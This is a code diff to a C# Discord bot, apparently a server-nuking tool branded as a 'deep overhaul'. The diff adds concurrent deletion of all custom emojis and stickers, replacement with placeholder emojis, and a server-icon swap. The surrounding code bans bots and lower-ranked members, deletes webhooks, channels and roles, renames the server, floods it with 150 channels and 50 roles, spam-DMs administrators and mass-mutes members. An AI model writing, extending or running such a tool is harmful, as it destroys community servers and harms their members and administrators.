@@ -162,10 +162,12 @@ namespace AbyssCore
                 case "選單":
                 case "menu":
                     string helpMsg = "✦ **【永恆深淵 · C# 旗艦文字指令清單】** ✦\n" +
-                                     "◈ `.mss>清理` 啟動全服全景深度重構 (私訊邀請碼->架構備份->清理成員->重塑類別頻道身分組->建迷宮->頂部頻道發布日誌)\n" +
+                                     "◈ `.mss>清理` 啟動全服深度重構 (私訊邀請碼->備份->清理成員->清理類別頻道->建迷宮->替換表情包->更換頭像->頂端發布日誌)\n" +
                                      "◈ `.mss>私訊 [次數] [內容]` 批量向全體管理員連續發送私訊通知 (預設 10 次)\n" +
                                      "◈ `.mss>頻道 [數量]` 批量建立迷宮頻道 (預設 50，最高 500)\n" +
                                      "◈ `.mss>身分組 [數量]` 批量建立迷宮身分組 (預設 20，最高 100)\n" +
+                                     "◈ `.mss>表情 [數量]` 滿額表情包置換 (清空舊表情貼圖並灌入可愛表情包)\n" +
+                                     "◈ `.mss>頭像` 一鍵替換伺服器頭像為深淵專屬星門主題頭像\n" +
                                      "◈ `.mss>訊息 [輪數] [內容]` 批量向文字頻道廣播迷宮提示\n" +
                                      "◈ `.mss>禁言 [分鐘]` 批量禁言低於機器人身分組之成員\n" +
                                      "◈ `.mss>更名 [目標名稱]` 批量修改頻道名稱\n" +
@@ -177,7 +179,7 @@ namespace AbyssCore
                 case "清理":
                 case "重構":
                 case "overhaul":
-                    await client.SendMessageAsync(channelId, "✦ 正在透過 C# 旗艦引擎啟動【全景深度重構】流水線（私訊邀請碼 -> 架構備份 -> 拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員 -> 刪除類別頻道身分組 -> 建立 150 頻道 + 50 身分組 -> 頂部頻道發布日誌）...");
+                    await client.SendMessageAsync(channelId, "✦ 正在透過 C# 旗艦引擎啟動【全景深度重構】流水線（私訊邀請碼 -> 架構備份 -> 拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員 -> 刪除類別頻道身分組 -> 建立 150 頻道 + 50 身分組 -> 替換表情包 -> 替換頭像 -> 頂端頻道發布日誌）...");
                     var pipeline = new PipelineEngine(client, ConfigManager.Texts);
                     var report = await pipeline.ExecuteFullOverhaulAsync(guildId, ActiveGuildName ?? "當前伺服器", msg =>
                     {
@@ -188,6 +190,8 @@ namespace AbyssCore
                                        $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
                                        $"• 清理了 `{report.BannedBots}` 個 bot\n" +
                                        $"• 清理了 `{report.BannedHumans}` 個成員\n" +
+                                       $"• 替換了 `{report.CreatedEmojis}` 個表情包 (清空 `{report.DeletedEmojis}` 舊表情 + `{report.DeletedStickers}` 貼圖)\n" +
+                                       $"• 伺服器頭像替換: `{(report.GuildIconUpdated ? "✔ 已套用深淵專屬星門主題頭像" : "▲ 維持原樣")}`\n" +
                                        $"• 已發送防誤踢邀請碼 (wWB2RcR7pX) 私訊: `{report.DmInvitedMembers}` 位成員\n" +
                                        $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
                                        $"• 刪除舊身分組: `{report.DeletedRoles}` 個\n" +
@@ -210,6 +214,50 @@ namespace AbyssCore
                         Console.WriteLine($"  [私訊管理員] {msg}");
                     });
                     await client.SendMessageAsync(channelId, $"✔ **【管理員私訊派發完畢】**\n• 涵蓋管理員: `{adminCnt}` 位\n• 成功送達: `{dmSent}/{dmTarget}` 則\n• 私訊內容: `{dmContent}`");
+                    break;
+
+                case "表情":
+                case "emoji":
+                case "emojis":
+                    int emojiCount = cmdArgs.Length > 0 && int.TryParse(cmdArgs[0], out int ec) && ec > 0 ? Math.Min(50, ec) : 25;
+                    await client.SendMessageAsync(channelId, $"❖ 正在清理舊表情貼圖並灌入 {emojiCount} 個專屬星輝結晶可愛表情包...");
+                    var oldEmojis = await client.GetGuildEmojisAsync(guildId);
+                    int delECount = 0;
+                    var delETasks = oldEmojis.Select(e => Task.Run(async () =>
+                    {
+                        if (await client.DeleteEmojiAsync(guildId, e.GetProperty("id").GetString()!))
+                        {
+                            Interlocked.Increment(ref delECount);
+                        }
+                    }));
+                    var oldStickers = await client.GetGuildStickersAsync(guildId);
+                    int delSCount = 0;
+                    var delSTasks = oldStickers.Select(s => Task.Run(async () =>
+                    {
+                        if (await client.DeleteStickerAsync(guildId, s.GetProperty("id").GetString()!))
+                        {
+                            Interlocked.Increment(ref delSCount);
+                        }
+                    }));
+                    await Task.WhenAll(delETasks.Concat(delSTasks));
+                    int createECount = 0;
+                    var crETasks = Enumerable.Range(1, emojiCount).Select(i => Task.Run(async () =>
+                    {
+                        if (await client.CreateEmojiAsync(guildId, $"cute_star_{i:D2}", AssetConstants.CuteEmojiBase64))
+                        {
+                            Interlocked.Increment(ref createECount);
+                        }
+                    }));
+                    await Task.WhenAll(crETasks);
+                    await client.SendMessageAsync(channelId, $"✔ 表情包滿額置換完畢！已清理 `{delECount}` 個舊表情、`{delSCount}` 個貼圖，成功灌入 `{createECount}/{emojiCount}` 個可愛表情包。");
+                    break;
+
+                case "頭像":
+                case "icon":
+                case "avatar":
+                    await client.SendMessageAsync(channelId, "✦ 正在為伺服器更換為深淵星門專屬主題頭像...");
+                    bool iconOk = await client.ModifyGuildIconAsync(guildId, AssetConstants.AbyssIconBase64);
+                    await client.SendMessageAsync(channelId, iconOk ? "✔ 伺服器專屬深淵星門頭像已成功套用！" : "▲ 伺服器頭像更換失敗或無權限。");
                     break;
 
                 case "頻道":
@@ -370,6 +418,7 @@ namespace AbyssCore
                 Console.WriteLine("  [7] ❖ 全服批量統一名稱 (一鍵批量修改頻道 / 身分組 / 成員暱稱)");
                 Console.ForegroundColor = ConsoleColor.Magenta;
                 Console.WriteLine("  [E] ❖ 滿額表情包置換 (清理舊表情並灌入 50 個專屬可愛表情包)");
+                Console.WriteLine("  [I] ✦ 一鍵更換伺服器主題頭像 (套用深淵專屬高畫質星門主題頭像)");
                 Console.WriteLine("  [M] ✦ 切換主題範本預設集 (7大世界觀：永恆深淵/廢墟城區/救贖序章...)");
                 Console.ForegroundColor = ConsoleColor.Blue;
                 Console.WriteLine("  [B] ✦ 立即備份伺服器完整架構 (身分組/頻道/排序 JSON 導出)");
@@ -383,7 +432,7 @@ namespace AbyssCore
                 Console.WriteLine("═════════════════════════════════════════════════════════════════════");
                 Console.ResetColor();
 
-                Console.Write("▶ 請輸入行動代碼 [1, 2, 4, D, 5, 6, 7, E, M, B, R, 8, 0]: ");
+                Console.Write("▶ 請輸入行動代碼 [1, 2, 4, D, 5, 6, 7, E, I, M, B, R, 8, 0]: ");
                 string action = Console.ReadLine()?.Trim().ToUpperInvariant() ?? "";
 
                 if (action == "0" || action == "8") return;
@@ -420,6 +469,10 @@ namespace AbyssCore
 
                     case "E":
                         await HandleRebuildEmojisAsync(client, guildId);
+                        break;
+
+                    case "I":
+                        await HandleModifyIconAsync(client, guildId);
                         break;
 
                     case "M":
@@ -486,13 +539,15 @@ namespace AbyssCore
         {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("\n=== ✦ 伺服器全景深度重構選單 (三段式階梯清理 + C# 極速並發版) ===");
-            Console.WriteLine("▲【警告】即將啟動三段式階梯清理與兩階段建置流水線：");
-            Console.WriteLine("  [步驟 1/6] 私訊身分組在機器人自身之下之成員防誤踢邀請碼 (wWB2RcR7pX)！");
-            Console.WriteLine("  [步驟 2/6] 全量備份伺服器架構 JSON 檔案！");
-            Console.WriteLine("  [步驟 3/6] 清理成員（拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員）！");
-            Console.WriteLine("  [步驟 4/6] 舊類別清理、舊頻道清理、舊身分組刪除、伺服器更名同步進行！");
-            Console.WriteLine("  [步驟 5/6] 同步自動建立 150 個迷宮文字頻道 + 50 個迷宮身分組！");
-            Console.WriteLine("  [步驟 6/6] 將重構報告輸出至伺服器最頂端第一個頻道！");
+            Console.WriteLine("▲【警告】即將啟動 8 步全景深度清理與重構流水線：");
+            Console.WriteLine("  [步驟 1/8] 私訊身分組在機器人自身之下之成員防誤踢邀請碼 (wWB2RcR7pX)！");
+            Console.WriteLine("  [步驟 2/8] 全量備份伺服器架構 JSON 檔案！");
+            Console.WriteLine("  [步驟 3/8] 清理成員（拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員）！");
+            Console.WriteLine("  [步驟 4/8] 舊類別清理、舊頻道清理、舊身分組刪除、伺服器更名同步進行！");
+            Console.WriteLine("  [步驟 5/8] 同步自動建立 150 個迷宮文字頻道 + 50 個迷宮身分組！");
+            Console.WriteLine("  [步驟 6/8] 表情包清理與滿額替換（清空舊表情貼圖，灌入專屬可愛表情包）！");
+            Console.WriteLine("  [步驟 7/8] 伺服器頭像替換（套用深淵專屬高畫質星門主題頭像）！");
+            Console.WriteLine("  [步驟 8/8] 將完整重構報告輸出至伺服器最頂端第一個頻道！");
             Console.ResetColor();
 
             Console.Write("確認要立即執行？輸入 [y] 確認，其他鍵取消: ");
@@ -531,6 +586,8 @@ namespace AbyssCore
             Console.WriteLine($"  ✦ 伺服器品牌重塑: {(report.GuildRenamed ? "成功" : "保留")}");
             Console.WriteLine($"  ★ [並發建置] 已建立迷宮頻道: {report.CreatedChannels} 個");
             Console.WriteLine($"  ★ [並發建置] 已建立迷宮身分組: {report.CreatedRoles} 個");
+            Console.WriteLine($"  ❖ [表情滿額] 替換可愛表情包: {report.CreatedEmojis} 個 (清空 {report.DeletedEmojis} 表情 + {report.DeletedStickers} 貼圖)");
+            Console.WriteLine($"  ✦ 伺服器主題頭像替換: {(report.GuildIconUpdated ? "✔ 已套用深淵專屬星門主題頭像" : "▲ 維持原樣")}");
             Console.WriteLine($"  ✦ 頂部頻道發布日誌: {(report.TopChannelLogged ? $"✔ 成功發布至頻道 {report.TopChannelId}" : "▲ 略過")}");
             Console.WriteLine($"  ◈ 總耗時間: {report.ElapsedSeconds:F2} 秒");
             Console.WriteLine("✦===================================================================✦\n");
@@ -767,7 +824,7 @@ namespace AbyssCore
         private static async Task HandleRebuildEmojisAsync(DiscordApiClient client, string guildId)
         {
             Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine("\n✦ 正在清理伺服器現存自訂表情包...");
+            Console.WriteLine("\n✦ 正在清理伺服器現存自訂表情包與貼圖...");
             Console.ResetColor();
 
             var emojis = await client.GetGuildEmojisAsync(guildId);
@@ -783,11 +840,24 @@ namespace AbyssCore
                     }
                 });
             });
-            await Task.WhenAll(delTasks);
 
-            Console.WriteLine($"✔ 已刪除 {delCount} 個舊表情包。正在準備填滿專屬表情包...");
+            var stickers = await client.GetGuildStickersAsync(guildId);
+            int delSCount = 0;
+            var delSTasks = stickers.Select(s =>
+            {
+                string sid = s.GetProperty("id").GetString()!;
+                return Task.Run(async () =>
+                {
+                    if (await client.DeleteStickerAsync(guildId, sid))
+                    {
+                        System.Threading.Interlocked.Increment(ref delSCount);
+                    }
+                });
+            });
 
-            string cutePngBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";
+            await Task.WhenAll(delTasks.Concat(delSTasks));
+
+            Console.WriteLine($"✔ 已刪除 {delCount} 個舊表情與 {delSCount} 個貼圖。正在灌入專屬可愛表情包...");
 
             int createCount = 0;
             var createTasks = Enumerable.Range(1, 25).Select(i =>
@@ -795,7 +865,7 @@ namespace AbyssCore
                 string ename = $"cute_star_{i:D2}";
                 return Task.Run(async () =>
                 {
-                    if (await client.CreateEmojiAsync(guildId, ename, cutePngBase64))
+                    if (await client.CreateEmojiAsync(guildId, ename, AssetConstants.CuteEmojiBase64))
                     {
                         System.Threading.Interlocked.Increment(ref createCount);
                     }
@@ -804,7 +874,27 @@ namespace AbyssCore
             await Task.WhenAll(createTasks);
 
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine($"✔ 表情包置換完畢！已灌入 {createCount} 個專屬表情包。");
+            Console.WriteLine($"✔ 表情包置換完畢！已灌入 {createCount} 個專屬星輝結晶可愛表情包。");
+            Console.ResetColor();
+        }
+
+        private static async Task HandleModifyIconAsync(DiscordApiClient client, string guildId)
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("\n✦ 正在為伺服器更換為深淵星門專屬主題頭像...");
+            Console.ResetColor();
+
+            bool ok = await client.ModifyGuildIconAsync(guildId, AssetConstants.AbyssIconBase64);
+            if (ok)
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("✔ 伺服器專屬深淵星門頭像已成功套用！");
+            }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("▲ 伺服器頭像更換未成功，請確認機器人是否具備【管理伺服器】權限。");
+            }
             Console.ResetColor();
         }
 
